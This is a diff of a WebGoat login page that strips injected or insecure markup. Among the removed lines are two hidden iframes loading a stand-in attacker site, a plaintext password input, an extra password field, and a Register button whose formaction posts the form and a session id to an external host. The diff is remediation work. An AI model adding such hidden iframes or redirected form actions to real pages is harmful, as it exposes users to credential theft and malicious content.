@@ -18,11 +18,9 @@
         <!-- Custom styles for this theme -->
         <link rel="stylesheet" href="css/main.css"/>
         <!--  end of CSS -->
-        <iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
-    <iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
+  
     </style>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+      
 </head>
 <body onload='document.loginForm.username.focus();'>
     <section id="container" ng-controller="goatLesson">
@@ -57,18 +55,15 @@
                     </div>
                     <div class="form-group">
                         <label for="exampleInputPassword1">Password</label>
-                        <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Password" name='password'>
+                        <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name='password'>
                     </div>
-                     <div class="form-group">
-                        <label for="exampleInputPassword1">Password1</label>
-                        <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Password1" name='password1'>
-                    </div>
+                   
                     
 
                     <input type="hidden" name="${_csrf.parameterName}"
                            value="${_csrf.token}" />
                     <button class="btn btn-large btn-primary" type="submit">Sign in</button>
-                    <button class="btn btn-large btn-primary" type="submit" formaction="http://Examples.com/sale/saleitems;jsessionid=2P0OC2oJM0DPXSNQPLME34SERTBG/dest=Maldives">Register</button>
+                    
                 </form>
                 <br/><br/>
                 <h4>The following accounts are built into Webgoat</h4>
@@ -88,6 +83,6 @@
         </section> 
     </section>
 
-<a _ngcontent-serverapp-c6="" class="socialLink" target="_blank" title="Jockey India Facebook" href="https://www.facebook.com/jockeyindia"><span _ngcontent-serverapp-c6="" class="kz-facebook"></span></a>
+
 </body>
 </html>
